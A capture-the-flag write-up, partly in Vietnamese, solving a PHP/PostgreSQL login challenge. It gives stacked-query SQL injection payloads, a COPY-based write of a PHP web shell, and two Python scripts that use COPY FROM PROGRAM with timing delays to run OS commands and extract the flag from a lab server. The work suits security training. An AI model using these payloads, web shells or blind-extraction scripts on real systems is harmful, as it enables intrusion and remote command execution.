# Description:

This is because traditional SQL injection techniques. Could you execute command?

The challenge is running in PostgreSQL and PHP.

Flag File: /flagXXXX.txt
Flag Format: CHH{XXX}

<img width="1919" height="977" alt="image" src="https://github.com/user-attachments/assets/1458a5e3-e67d-41a1-856c-6e35f834b4eb" />

# Solution:

= Thực hiện lệnh `guest';select pg_sleep(5)--` thì thấy load 5 giây

=> Stacked Query

= Gõ `guest'; COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/www/upload/shell.php';-- -` thì thấy 
<img width="428" height="107" alt="image" src="https://github.com/user-attachments/assets/ae1afca5-96ce-4d27-8f27-ba6a2ff8cbbf" />

= Thử lệnh liệt kê các thư mục file

```
guest'; COPY (SELECT '<?php system("ls / -m");?>') TO '/www/upload/shell.php';-- -
```

= Chạy script:

```
import requests
import time

charset = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz.0123456789_!@#$%^&*()}{ '
flag = ''

burp0_url = "http://103.97.125.56:31153/index.php"
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://103.97.125.56:31153/",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://103.97.125.56:31153/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}
for index in range (1,100):
    for c in charset:
        burp0_data = {
            "username": f"9999';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'ls / -m';select case when substring(cmd_output,{index},1)='{c}' then pg_sleep(5) else pg_sleep(0) end FROM cmd_exec limit 1;DROP TABLE IF EXISTS cmd_exec;-- ",
            "password": "2"
        }

        print("dang test ki tu thu ",index," :",c,end="\r")
        
        start_time = time.time()
        response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        end_time = time.time()

        # Calculate the response time
        response_time = end_time - start_time

        # Check if the response time is approximately 5 seconds
        if response_time >= 5:
            flag += c
            print("\n","The FLAG is:",flag)
            break

print("finished!!!!!")

```

= FLag là `flagOfmBj.txt`

<img width="672" height="375" alt="image" src="https://github.com/user-attachments/assets/fb1c5186-87ce-4353-8239-a8befda76f9a" />

= Đọc flag:

```
import requests
import time

charset = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz.0123456789_!@#$%^&*()}{ '
flag = ''

burp0_url = "http://103.97.125.56:31153/index.php"
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://103.97.125.56:31153",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://103.97.125.56:31153/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}
for index in range (1,100):
    for c in charset:
        burp0_data = {
            "username": f"9999';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'cat /flagOfmBj.txt';select case when substring(cmd_output,{index},1)='{c}' then pg_sleep(5) else pg_sleep(0) end FROM cmd_exec limit 1;DROP TABLE IF EXISTS cmd_exec;-- ",
            "password": "2"
        }

        print("dang test ki tu thu ",index," :",c,end="\r")
        
        start_time = time.time()
        response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        end_time = time.time()

        # Calculate the response time
        response_time = end_time - start_time

        # Check if the response time is approximately 5 seconds
        if response_time >= 5:
            flag += c
            print("\n","The FLAG is:",flag)
            break

print("finished!!!!!")
```

<img width="955" height="772" alt="image" src="https://github.com/user-attachments/assets/bcb0df54-b3e5-405c-beb7-036c50e82566" />






